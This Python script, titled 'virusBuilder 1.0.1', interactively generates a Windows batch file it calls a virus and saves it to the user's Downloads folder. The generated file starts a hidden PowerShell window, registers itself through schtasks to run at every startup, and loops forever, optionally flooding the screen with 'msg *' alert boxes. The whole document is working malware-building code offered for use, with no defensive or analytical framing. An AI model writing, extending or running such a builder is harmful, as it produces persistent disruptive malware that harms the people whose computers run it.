import os
#Title
print("virusBuilder 1.0.1")
print("by VulnerabilityVigilante")
print("\n")



# Get the current user's Downloads folder
downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")

#Set virus title
file_name = input("What would you like to name the virus file? (title only, no extensions) ")
file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
print("")
#Managing exceptions for non-permitted characters
while file_name_confirmation != 'y' and file_name_confirmation != 'n':
    print("Please enter either y or n")
    file_name = input("What would you like to name the virus file? (title only, no extensions) ")
    file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
    print("")

#User confirms virus file title. Append .bat extension and set file path for virus writing
if file_name_confirmation == 'y':
    file_path = os.path.join(downloads_folder, file_name)
    print("File created, time to cook up a virus!")
if file_name_confirmation == 'n':
    while file_name_confirmation != 'y':
        file_name = input("What would you like to name the virus file? (title only, no extensions) ")
        file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
        print("")
        while file_name_confirmation != 'y' and file_name_confirmation != 'n':
            print("Please enter either y or n")
            print("")
            file_name = input("What would you like to name the virus file? (title only, no extensions) ")
            file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
            print("")
    print("File created, time to cook up a virus!")
    print("")

#Establish headers
file_name = file_name + ".bat"
file_path = os.path.join(downloads_folder, file_name)
with open(file_path, "w") as file:
    file.write("cmd /c powershell -Nop -NonI -Nologo -WindowStyle Hidden \"Write-Host\""+ "\n")
    file.write("@echo off \n")
    file.write("schtasks /create /tn \"MyTask\" /tr \"%0\" /sc ONSTART\n")
    file.write(":loop \n")




#Custom Alert Box Option
print("")
customAlertBox = input("Would you like to add a custom alert box? (y/n) ")
#Loop if input is not either "y" or "n"
while customAlertBox != 'y' and customAlertBox != 'n':
        print("Please enter either y or n")
        customAlertBox = input("Would you like to add a custom alert box? (y/n) ")
#If custom alert box option is turned on
if customAlertBox == 'y':
    #Set body of custom alert box
    alertBody = input("What would you like put as the body of the alert box? ")
    alertBodyConfirmation = input("Are you sure you would like to put '" + alertBody + "' as your alert message? (y/n) ")
    #Managing exceptions for non-permitted characters
    while alertBodyConfirmation != 'y' and alertBodyConfirmation != 'n':
        print("Please enter either y or n")
        alertBody = input("What would you like put as the message of the alert box? ")
        alertBodyConfirmation = input("Are you sure you would like to put '" + alertBody + "' as your alert message? (y/n) ")
    #User confirms body of alert
    if alertBodyConfirmation == 'y':
        with open(file_path, "a") as file:
            file.write("msg * " + alertBody + "\n")
    #If user does not confirm body of alert
    else:
        #Loop until user is happy with input
        while alertBodyConfirmation != 'y':
            alertBody = input("What would you like put as the message of the alert box? ")
            alertBodyConfirmation = input("Are you sure you would like to put '" + alertBody + "' as your alert message? (y/n) ")
            #Loop if user inputs something other than y or x
            while alertBodyConfirmation != 'y' and alertBodyConfirmation != 'n':
                print("Please enter either y or n")
                alertBody = input("What would you like put as the message of the alert box? ")
                alertBodyConfirmation = input("Are you sure you would like to put \"" + alertBody + "\" as your alert message? (y/n) ")

#If custom alerts are turned off
else:
    print("")
    print("Very well, would you like to run the default message or not have alert boxes?")
    print("1: Default Message")
    print("2: No Alert Boxes")
    alertBoxOption = input("Number: ")
    while alertBoxOption != '1' and alertBoxOption != '2':
        print("Please enter 1 or 2")
        print("Would you like to run the default message or not have alert boxes?")
        print("1: Default Message")
        print("2: No Alert Boxes")
        alertBoxOption = input("Number: ")
    if alertBoxOption == '1':
        print("Using default message")
        with open(file_path, "a") as file:
            file.write("msg * click OK \n")
    else:
        print("Understood. Alert boxes will not be included.")


#Batchfile footer to finish loop with no exit
with open(file_path, "a") as file:
    file.write("goto loop\n")

print("")
print("Virus created, check it out at " + file_path) 